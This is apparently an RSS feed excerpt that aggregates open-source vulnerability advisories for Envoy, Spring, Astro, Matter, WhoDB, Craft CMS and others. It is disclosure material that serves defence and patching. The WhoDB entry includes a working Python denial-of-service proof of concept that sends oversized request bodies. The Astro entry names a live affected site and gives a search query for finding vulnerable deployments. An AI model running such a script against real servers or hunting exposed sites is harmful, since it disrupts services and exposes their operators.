                <item>
                    <title>BIT-envoy-2024-53269: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-envoy-2024-53269</link>
                    <pubDate>2024-12-20T07:08:41.110Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-envoy-2024-53269'>https://osv.dev/vulnerability/BIT-envoy-2024-53269</a><br>
                            <b>Published:</b> 2024-12-20T07:08:41.110Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/envoyproxy/envoy/pull/37743/commits/3f62168d86aceb90f743f63b50cc711710b1c401'>https://github.com/envoyproxy/envoy/pull/37743/commits/3f62168d86aceb90f743f63b50cc711710b1c401</a></li><li>- <a target='_blank' href='https://github.com/envoyproxy/envoy/security/advisories/GHSA-mfqp-7mmj-rm53'>https://github.com/envoyproxy/envoy/security/advisories/GHSA-mfqp-7mmj-rm53</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Envoy is a cloud-native high-performance edge&#x2F;middle&#x2F;service proxy. When additional address are not ip addresses, then the Happy Eyeballs sorting algorithm will crash in data plane. This issue has been addressed in releases 1.32.2, 1.31.4, and 1.30.8. Users are advised to upgrade. Users unable to upgrade may disable Happy Eyeballs and&#x2F;or change the IP configuration.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-envoy-2024-53270: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-envoy-2024-53270</link>
                    <pubDate>2024-12-20T07:08:32.803Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-envoy-2024-53270'>https://osv.dev/vulnerability/BIT-envoy-2024-53270</a><br>
                            <b>Published:</b> 2024-12-20T07:08:32.803Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/envoyproxy/envoy/pull/37743/commits/6cf8afda956ba67c9afad185b962325a5242ef02'>https://github.com/envoyproxy/envoy/pull/37743/commits/6cf8afda956ba67c9afad185b962325a5242ef02</a></li><li>- <a target='_blank' href='https://github.com/envoyproxy/envoy/security/advisories/GHSA-q9qv-8j52-77p3'>https://github.com/envoyproxy/envoy/security/advisories/GHSA-q9qv-8j52-77p3</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Envoy is a cloud-native high-performance edge&#x2F;middle&#x2F;service proxy. In affected versions `sendOverloadError` is going to assume the active request exists when `envoy.load_shed_points.http1_server_abort_dispatch` is configured. If `active_request` is nullptr, only onMessageBeginImpl() is called. However, the `onMessageBeginImpl` will directly return ok status if the stream is already reset leading to the nullptr reference. The downstream reset can actually happen during the H&#x2F;2 upstream reset. As a result envoy may crash. This issue has been addressed in releases 1.32.3, 1.31.5, 1.30.9, and 1.29.12. Users are advised to upgrade. Users unable to upgrade may disable `http1_server_abort_dispatch` load shed point and&#x2F;or use a high threshold.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-envoy-2024-53271: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-envoy-2024-53271</link>
                    <pubDate>2024-12-20T07:08:24.205Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-envoy-2024-53271'>https://osv.dev/vulnerability/BIT-envoy-2024-53271</a><br>
                            <b>Published:</b> 2024-12-20T07:08:24.205Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/envoyproxy/envoy/commit/da56f6da63079baecef9183436ee5f4141a59af8'>https://github.com/envoyproxy/envoy/commit/da56f6da63079baecef9183436ee5f4141a59af8</a></li><li>- <a target='_blank' href='https://github.com/envoyproxy/envoy/security/advisories/GHSA-rmm5-h2wv-mg4f'>https://github.com/envoyproxy/envoy/security/advisories/GHSA-rmm5-h2wv-mg4f</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Envoy is a cloud-native high-performance edge&#x2F;middle&#x2F;service proxy. In affected versions envoy  does not properly handle http 1.1 non-101 1xx responses. This can lead to downstream failures in networked devices. This issue has been addressed in versions 1.31.5 and 1.32.3. Users are advised to upgrade. There are no known workarounds for this issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1391: 0 | <b>Heap-buffer-overflow in gsicc_create_getv2buffer</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1391</link>
                    <pubDate>2024-12-20T00:03:10.307442Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1391'>https://osv.dev/vulnerability/OSV-2024-1391</a><br>
                            <b>Published:</b> 2024-12-20T00:03:10.307442Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=384972943'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=384972943</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in gsicc_create_getv2buffer</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=384972943

```
Crash type: Heap-buffer-overflow READ 12
Crash state:
gsicc_create_getv2buffer
pdf_iccbased_color_space
pdf_color_space_named
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-rv83-h68q-c4wq: 7.5 | <b>GoPhish sends cleartext passwords</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-rv83-h68q-c4wq</link>
                    <pubDate>2024-12-19T21:31:10Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-rv83-h68q-c4wq'>https://osv.dev/vulnerability/GHSA-rv83-h68q-c4wq</a><br>
                            <b>Published:</b> 2024-12-19T21:31:10Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gophish/gophish'>https://github.com/gophish/gophish</a></li><li>- <a target='_blank' href='https://github.com/hexkaster/SecurityResearch/blob/main/CVE-2024-55196.md'>https://github.com/hexkaster/SecurityResearch/blob/main/CVE-2024-55196.md</a></li></ul><br>
                            <b>Details:</b> <b>GoPhish sends cleartext passwords</b><br>Insufficiently Protected Credentials in the Mail Server Configuration in GoPhish v0.12.1 allows an attacker to access cleartext passwords for the configured IMAP and SMTP servers.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-g5vr-rgqm-vf78: 7.5 | <b>Spring Framework Path Traversal vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-g5vr-rgqm-vf78</link>
                    <pubDate>2024-12-19T18:31:38Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-g5vr-rgqm-vf78'>https://osv.dev/vulnerability/GHSA-g5vr-rgqm-vf78</a><br>
                            <b>Published:</b> 2024-12-19T18:31:38Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/spring-projects/spring-framework/issues/33689'>https://github.com/spring-projects/spring-framework/issues/33689</a></li><li>- <a target='_blank' href='https://github.com/spring-projects/spring-framework/commit/3bfbe30a7814c9ea1556d40df9bd87ddb3ba372d'>https://github.com/spring-projects/spring-framework/commit/3bfbe30a7814c9ea1556d40df9bd87ddb3ba372d</a></li><li>- <a target='_blank' href='https://github.com/spring-projects/spring-framework/commit/fb7890d73975a3d9e0763e0926df2bd0a608e87e'>https://github.com/spring-projects/spring-framework/commit/fb7890d73975a3d9e0763e0926df2bd0a608e87e</a></li><li>- <a target='_blank' href='https://github.com/spring-projects/spring-framework'>https://github.com/spring-projects/spring-framework</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20250110-0010'>https://security.netapp.com/advisory/ntap-20250110-0010</a></li><li>- <a target='_blank' href='https://spring.io/security/cve-2024-38819'>https://spring.io/security/cve-2024-38819</a></li></ul><br>
                            <b>Details:</b> <b>Spring Framework Path Traversal vulnerability</b><br>Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-5pf6-cq2v-23ww: 7.5 | <b>WhoDB Allows Unbounded Memory Consumption in Authentication Middleware Can Lead to Denial of Service</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-5pf6-cq2v-23ww</link>
                    <pubDate>2024-12-19T15:22:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-5pf6-cq2v-23ww'>https://osv.dev/vulnerability/GHSA-5pf6-cq2v-23ww</a><br>
                            <b>Published:</b> 2024-12-19T15:22:43Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/clidey/whodb/security/advisories/GHSA-5pf6-cq2v-23ww'>https://github.com/clidey/whodb/security/advisories/GHSA-5pf6-cq2v-23ww</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/commit/e8b608d35422e1a2bfffe8ed26f0211ea80cb439'>https://github.com/clidey/whodb/commit/e8b608d35422e1a2bfffe8ed26f0211ea80cb439</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb'>https://github.com/clidey/whodb</a></li></ul><br>
                            <b>Details:</b> <b>WhoDB Allows Unbounded Memory Consumption in Authentication Middleware Can Lead to Denial of Service</b><br>### Summary
A Denial of Service (DoS) vulnerability in the authentication middleware allows any client to cause memory exhaustion by sending large request bodies. The server reads the entire request body into memory without size limits, creating multiple copies during processing, which can lead to Out of Memory conditions.

Affects all versions up to the latest one (v0.43.0).

### Details


The vulnerability exists in the AuthMiddleware function in `core&#x2F;src&#x2F;auth&#x2F;auth.go`. The middleware processes all API requests (`&#x2F;api&#x2F;*`) and reads the entire request body using `io.ReadAll` without any size limits:

```go
func AuthMiddleware(next http.Handler) http.Handler {
  return http.HandlerFunc(func(w http.ResponseWriter, r http.Request) {
    &#x2F;&#x2F; No size limit on body reading
    body, err := io.ReadAll(r.Body)

    &#x2F;&#x2F; ...

    &#x2F;&#x2F; Creates another copy of the body
    r.Body = io.NopCloser(bytes.NewReader(body))

    &#x2F;&#x2F; ...

    &#x2F;&#x2F; Unmarshals the body again, creating more copies
    if err := json.Unmarshal(body, &amp;query); err != nil {
        return false
    }
  })
}
```

The issue is amplified by:
1. A generous 10-minute timeout (`middleware.Timeout(10*time.Minute)`)
2. High throttle limits (10000 concurrent requests, 1000 backlog)
3. Multiple copies of the request body being created during processing
4. No per-client rate limiting

### PoC

1. Run the latest WhoDB:

```
docker run -it -p 127.0.0.1:8080:8080 clidey&#x2F;whodb
```

2. Prepare a PoC Python script:

```python
import requests
import base64
import json
import time

# Create a sample token
credentials = {
    &quot;database&quot;: &quot;test&quot;
}
token = base64.b64encode(json.dumps(credentials).encode()).decode()

# Create a large query that will pass initial checks
# Using &quot;Login&quot; operation which is allowed
payload = {
    &quot;operationName&quot;: &quot;Login&quot;,
    &quot;variables&quot;: {},
    # Create a large string (512 MB)
    &quot;query&quot;: &quot;A&quot; * (512 * 1024 * 1024)
}

headers = {
    &quot;Content-Type&quot;: &quot;application&#x2F;json&quot;,
    &quot;Cookie&quot;: f&quot;Token={token}&quot;  # or use Authorization header if IsAPIGatewayEnabled
}

url = &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;api&#x2F;query&quot;  # adjust as needed

print(&quot;Sending large payload...&quot;)
start = time.time()
try:
    response = requests.post(url, json=payload, headers=headers)
    print(f&quot;Response status: {response.status_code}&quot;)
except Exception as e:
    print(f&quot;Request failed: {e}&quot;)
print(f&quot;Time taken: {time.time() - start:.2f}s&quot;)
```

3. Run the script and observe memory usage of the WhoDB container. Run it a few times in parallel, or increase the payload size. I was able to hit the OOM killer on a 8 GB VM quickly. Process &quot;core&quot; is the entrypoint of the container.

```
[3970241.161574] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=docker-92dede9aa7833cc0db5d7f780a46f57f0b7d627a15d9d0dd6233cd03544542ec.scope,mems_allowed=0,global_oom,task_memcg=&#x2F;system.slice&#x2F;docker-92dede9aa7833cc0db5d7f780a46f57f0b7d627a15d9d0dd6233cd03544542ec.scope,task=core,pid=411856,uid=0
[3970241.161611] Out of memory: Killed process 411856 (core) total-vm:8359408kB, anon-rss:5548564kB, file-rss:0kB, shmem-rss:0kB, UID:0 pgtables:11032kB oom_score_adj:0
```

### Impact

- Severity: High
- Authentication Required: No (public API endpoint)
- Affected Components: All API endpoints (`&#x2F;api&#x2F;*`)
- Impact Type: Denial of Service

Any client can send arbitrarily large request bodies to the API endpoints. Due to the multiple copies created during processing and lack of size limits, this can quickly exhaust server memory, potentially affecting all users of the system. The high concurrent request limits and long timeout make this particularly effective for DoS attacks.

Fix considerations:
1. Implement request body size limits using `http.MaxBytesReader`
2. Reduce the request timeout from 10 minutes
3. Implement per-client rate limiting
4. Consider streaming body processing instead of loading entirely into memory

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-47h8-jmp3-9f28: 9.8 | <b>pyrage vulnerable to malicious plugin names, recipients, or identities causing arbitrary binary execution</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-47h8-jmp3-9f28</link>
                    <pubDate>2024-12-19T15:14:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-47h8-jmp3-9f28'>https://osv.dev/vulnerability/GHSA-47h8-jmp3-9f28</a><br>
                            <b>Published:</b> 2024-12-19T15:14:06Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/FiloSottile/age/security/advisories/GHSA-32gq-x56h-299c'>https://github.com/FiloSottile/age/security/advisories/GHSA-32gq-x56h-299c</a></li><li>- <a target='_blank' href='https://github.com/str4d/rage/security/advisories/GHSA-4fg7-vxc8-qx5w'>https://github.com/str4d/rage/security/advisories/GHSA-4fg7-vxc8-qx5w</a></li><li>- <a target='_blank' href='https://github.com/woodruffw/pyrage/security/advisories/GHSA-47h8-jmp3-9f28'>https://github.com/woodruffw/pyrage/security/advisories/GHSA-47h8-jmp3-9f28</a></li><li>- <a target='_blank' href='https://github.com/woodruffw/pyrage'>https://github.com/woodruffw/pyrage</a></li></ul><br>
                            <b>Details:</b> <b>pyrage vulnerable to malicious plugin names, recipients, or identities causing arbitrary binary execution</b><br>`pyrage` uses the Rust `age` crate for its underlying operations, and `age` is vulnerable to GHSA-4fg7-vxc8-qx5w.

All details of GHSA-4fg7-vxc8-qx5w are relevant to `pyrage` for the versions specified in this advisory. See GHSA-4fg7-vxc8-qx5w for full details.

Versions of `pyrage` before 1.2.0 lack plugin support and are therefore **not affected**.

An equivalent issue was fixed in [the reference Go implementation of age](https:&#x2F;&#x2F;github.com&#x2F;FiloSottile&#x2F;age), see advisory [GHSA-32gq-x56h-299c](https:&#x2F;&#x2F;github.com&#x2F;FiloSottile&#x2F;age&#x2F;security&#x2F;advisories&#x2F;GHSA-32gq-x56h-299c).

Thanks to ⬡-49016 for reporting this issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-49w6-73cw-chjr: 7.8 | <b>Astro&#x27;s server source code is exposed to the public if sourcemaps are enabled</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-49w6-73cw-chjr</link>
                    <pubDate>2024-12-19T15:12:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-49w6-73cw-chjr'>https://osv.dev/vulnerability/GHSA-49w6-73cw-chjr</a><br>
                            <b>Published:</b> 2024-12-19T15:12:33Z<br>
                            <b>Severity:</b> 7.8<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr'>https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro/issues/12703'>https://github.com/withastro/astro/issues/12703</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515'>https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5'>https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50'>https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro'>https://github.com/withastro/astro</a></li><li>- <a target='_blank' href='https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139'>https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li></ul><br>
                            <b>Details:</b> <b>Astro&#x27;s server source code is exposed to the public if sourcemaps are enabled</b><br>### Summary
A bug in the build process allows any unauthenticated user to read parts of the server source code.

### Details
During build, along with client assets such as css and font files, the sourcemap files **for the server code** are moved to a publicly-accessible folder.
https:&#x2F;&#x2F;github.com&#x2F;withastro&#x2F;astro&#x2F;blob&#x2F;176fe9f113fd912f9b61e848b00bbcfecd6d5c2c&#x2F;packages&#x2F;astro&#x2F;src&#x2F;core&#x2F;build&#x2F;static-build.ts#L139

Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.

While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in `src&#x2F;pages`) are predictably named. For example. the sourcemap file for `src&#x2F;pages&#x2F;index.astro` gets named `dist&#x2F;client&#x2F;pages&#x2F;index.astro.mjs.map`.

### PoC
Here is one example of an affected open-source website:
https:&#x2F;&#x2F;creatorsgarten.org&#x2F;pages&#x2F;index.astro.mjs.map

&amp;lt;image width=&quot;500&quot; height=&quot;263&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;773c5532-87af-42b8-838e-8f5472bf9f68&quot;&#x2F;&amp;gt;

The file can be saved and opened using https:&#x2F;&#x2F;evanw.github.io&#x2F;source-map-visualization&#x2F; to reconstruct the source code.

&amp;lt;image width=&quot;500&quot; height=&quot;271&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7d35d0ca-3a29-4666-be21-cfefe311ac9d&quot;&#x2F;&amp;gt;

The above accurately mirrors the source code as seen in the repository: https:&#x2F;&#x2F;github.com&#x2F;creatorsgarten&#x2F;creatorsgarten.org&#x2F;blob&#x2F;main&#x2F;src&#x2F;pages&#x2F;index.astro

&amp;lt;image width=&quot;500&quot; height=&quot;298&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;39e77197-8382-4556-a024-c526dacccc1c&quot;&#x2F;&amp;gt;


The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com ([search results link](https:&#x2F;&#x2F;github.com&#x2F;search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code)):
```
path:astro.config.mjs @sentry&#x2F;astro
```

This vulnerability is the root cause of https:&#x2F;&#x2F;github.com&#x2F;withastro&#x2F;astro&#x2F;issues&#x2F;12703, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the `dist&#x2F;client` (referred to as `config.build.client` in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains `.map` files corresponding to the code that runs on the server.

### Impact
All **server-output** (SSR) projects on Astro 5 versions **v5.0.3** through **v5.0.6** (inclusive), that have **sourcemaps enabled**, either directly or through an add-on such as [sentry](https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;sentry-javascript&#x2F;blob&#x2F;develop&#x2F;packages&#x2F;astro&#x2F;src&#x2F;integration&#x2F;index.ts#L50), are affected. The fix for **server-output** projects was released in **astro@5.0.7**.

Additionally, all **static-output** (SSG) projects built using Astro 4 versions **4.16.17 or older**, or Astro 5 versions **5.0.7 or older**, that have **sourcemaps enabled** are also affected. The fix for **static-output** projects was released in **astro@5.0.8**, and backported to Astro v4 in **astro@4.16.18**.

The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.

There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .

There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.

- Network attack vector.
- Low attack complexity.
- No privileges required.
- No interaction required from an authorized user.
- Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed. 

### Remediation
The fix for **server-output** projects was released in **astro@5.0.7**, and the fix for **static-output** projects was released in **astro@5.0.8** and backported to Astro v4 in **astro@4.16.18**. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56317: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56317</link>
                    <pubDate>2024-12-18T23:15:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56317'>https://osv.dev/vulnerability/CVE-2024-56317</a><br>
                            <b>Published:</b> 2024-12-18T23:15:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/project-chip/connectedhomeip/issues/36535'>https://github.com/project-chip/connectedhomeip/issues/36535</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In Matter (aka connectedhomeip or Project CHIP) through 1.4.0.0, the WriteAcl function deletes all existing ACL entries first, and then attempts to recreate them based on user input. If input validation fails during decoding, the process stops, and no entries are restored by access-control-server.cpp, i.e., a denial of service.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56318: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56318</link>
                    <pubDate>2024-12-18T23:15:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56318'>https://osv.dev/vulnerability/CVE-2024-56318</a><br>
                            <b>Published:</b> 2024-12-18T23:15:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/project-chip/connectedhomeip/issues/36750'>https://github.com/project-chip/connectedhomeip/issues/36750</a></li><li>- <a target='_blank' href='https://github.com/project-chip/connectedhomeip/pull/36751'>https://github.com/project-chip/connectedhomeip/pull/36751</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In raw\TCP.cpp in Matter (aka connectedhomeip or Project CHIP) through 1.4.0.0 before 27ca6ec, there is a NULL pointer dereference in TCPBase::ProcessSingleMessage via TCP packets with zero messageSize, leading to denial of service.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56319: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56319</link>
                    <pubDate>2024-12-18T23:15:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56319'>https://osv.dev/vulnerability/CVE-2024-56319</a><br>
                            <b>Published:</b> 2024-12-18T23:15:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/project-chip/connectedhomeip/issues/36760'>https://github.com/project-chip/connectedhomeip/issues/36760</a></li><li>- <a target='_blank' href='https://github.com/project-chip/connectedhomeip/pull/36843'>https://github.com/project-chip/connectedhomeip/pull/36843</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In Matter (aka connectedhomeip or Project CHIP) through 1.4.0.0 before e3277eb, unlimited user label appends in a userlabel cluster can lead to a denial of service (resource exhaustion).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w32m-9786-jp63: 8.7 | <b>Non-linear parsing of case-insensitive content in golang.org&#x2F;x&#x2F;net&#x2F;html</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w32m-9786-jp63</link>
                    <pubDate>2024-12-18T21:59:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w32m-9786-jp63'>https://osv.dev/vulnerability/GHSA-w32m-9786-jp63</a><br>
                            <b>Published:</b> 2024-12-18T21:59:48Z<br>
                            <b>Severity:</b> 8.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/golang/go/issues/70906'>https://github.com/golang/go/issues/70906</a></li><li>- <a target='_blank' href='https://cs.opensource.google/go/x/net'>https://cs.opensource.google/go/x/net</a></li><li>- <a target='_blank' href='https://go.dev/cl/637536'>https://go.dev/cl/637536</a></li><li>- <a target='_blank' href='https://go.dev/issue/70906'>https://go.dev/issue/70906</a></li><li>- <a target='_blank' href='https://groups.google.com/g/golang-announce/c/wSCRmFnNmPA/m/Lvcd0mRMAwAJ'>https://groups.google.com/g/golang-announce/c/wSCRmFnNmPA/m/Lvcd0mRMAwAJ</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2024-3333'>https://pkg.go.dev/vuln/GO-2024-3333</a></li></ul><br>
                            <b>Details:</b> <b>Non-linear parsing of case-insensitive content in golang.org&#x2F;x&#x2F;net&#x2F;html</b><br>An attacker can craft an input to the Parse functions that would be processed non-linearly with respect to its length, resulting in extremely slow parsing. This could cause a denial of service.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j2v2-3784-vr44: 7.2 | <b>Duplicate Advisory: openCart Server-Side Template Injection (SSTI) vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j2v2-3784-vr44</link>
                    <pubDate>2024-12-18T21:30:56Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j2v2-3784-vr44'>https://osv.dev/vulnerability/GHSA-j2v2-3784-vr44</a><br>
                            <b>Published:</b> 2024-12-18T21:30:56Z<br>
                            <b>Severity:</b> 7.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/opencart/opencart/issues/13863'>https://github.com/opencart/opencart/issues/13863</a></li><li>- <a target='_blank' href='https://github.com/A3h1nt/CVEs/blob/main/OpenCart/Readme.md'>https://github.com/A3h1nt/CVEs/blob/main/OpenCart/Readme.md</a></li><li>- <a target='_blank' href='https://github.com/PawaritSanguanpang/CVEs/blob/main/OpenCart/CVE-2024-36694/README.md'>https://github.com/PawaritSanguanpang/CVEs/blob/main/OpenCart/CVE-2024-36694/README.md</a></li><li>- <a target='_blank' href='https://github.com/opencart/opencart/releases/tag/4.0.2.3'>https://github.com/opencart/opencart/releases/tag/4.0.2.3</a></li><li>- <a target='_blank' href='https://medium.com/@pawarit.sanguanpang/opencart-v4-0-2-3-server-side-template-injection-0b173a3bdcf9'>https://medium.com/@pawarit.sanguanpang/opencart-v4-0-2-3-server-side-template-injection-0b173a3bdcf9</a></li></ul><br>
                            <b>Details:</b> <b>Duplicate Advisory: openCart Server-Side Template Injection (SSTI) vulnerability</b><br>## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-xrh7-2gfq-4rcq. This link is maintained to preserve external references.

## Original Description
OpenCart 4.0.2.3 is vulnerable to Server-Side Template Injection (SSTI) via the Theme Editor Function.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2p6p-9rc9-62j9: 9.3 | <b>Craft CMS has potential RCE when PHP `register_argc_argv` config setting is enabled</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2p6p-9rc9-62j9</link>
                    <pubDate>2024-12-18T19:47:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2p6p-9rc9-62j9'>https://osv.dev/vulnerability/GHSA-2p6p-9rc9-62j9</a><br>
                            <b>Published:</b> 2024-12-18T19:47:26Z<br>
                            <b>Severity:</b> 9.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9'>https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9</a></li><li>- <a target='_blank' href='https://github.com/craftcms/cms/commit/82e893fb794d30563da296bca31379c0df0079b3'>https://github.com/craftcms/cms/commit/82e893fb794d30563da296bca31379c0df0079b3</a></li><li>- <a target='_blank' href='https://github.com/craftcms/cms'>https://github.com/craftcms/cms</a></li></ul><br>
                            <b>Details:</b> <b>Craft CMS has potential RCE when PHP `register_argc_argv` config setting is enabled</b><br>### Impact
You are affected if your php.ini configuration has `register_argc_argv` enabled.

### Patches
Update to 3.9.14, 4.13.2, or 5.5.2.

### Workarounds
If you can&#x27;t upgrade yet, and `register_argc_argv` is enabled, you can disable it to mitigate the issue.
                        ]]>
                    </description>
                </item>
            
                <item>
